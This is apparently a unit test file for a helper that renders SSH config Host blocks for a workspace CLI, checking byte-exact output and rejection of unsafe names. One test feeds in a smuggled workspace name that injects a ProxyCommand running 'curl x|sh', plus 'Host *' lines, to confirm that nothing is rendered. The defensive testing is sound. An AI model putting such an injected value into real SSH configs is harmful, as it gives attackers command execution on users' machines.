import { expect, test } from "bun:test";
import { sshConfigBlock, sshOneLiner } from "./ssh-config";

/** Byte-exact: this block is pasted into ~/.ssh/config, and it has to match what
 *  `kl ws ssh-config` writes (bins/kl/src/sshconfig.rs) or the two disagree about
 *  the same host. */
test("renders the Host block the CLI would have written", () => {
  expect(sshConfigBlock("gh", "ws-abc123")).toBe(
    "Host gh\n" +
      "  HostName ws-abc123\n" +
      "  User kl\n" +
      "  ProxyCommand kl ws proxy ws-abc123\n" +
      "  UserKnownHostsFile ~/.config/kl/known_hosts\n" +
      "  HostKeyAlias ws-abc123\n",
  );
});

test("the one-liner names the workspace, not its id", () => {
  expect(sshOneLiner("gh")).toBe("kl ws ssh gh");
});

/** The name reaches this function straight from the api, and the block is meant to be pasted
 *  into a file ssh executes. Anything but the safe alphabet renders nothing at all. */
test("a name that could inject ssh keywords renders no block", () => {
  expect(sshConfigBlock("x\n  ProxyCommand /bin/sh -c 'curl x|sh'\nHost *", "ws-1")).toBeNull();
  expect(sshConfigBlock("a b", "ws-1")).toBeNull();
  expect(sshConfigBlock("", "ws-1")).toBeNull();
  expect(sshConfigBlock("x".repeat(64), "ws-1")).toBeNull();
  // The id is checked too — it lands in HostName and HostKeyAlias.
  expect(sshConfigBlock("gh", "ws-1\nHost *")).toBeNull();
});
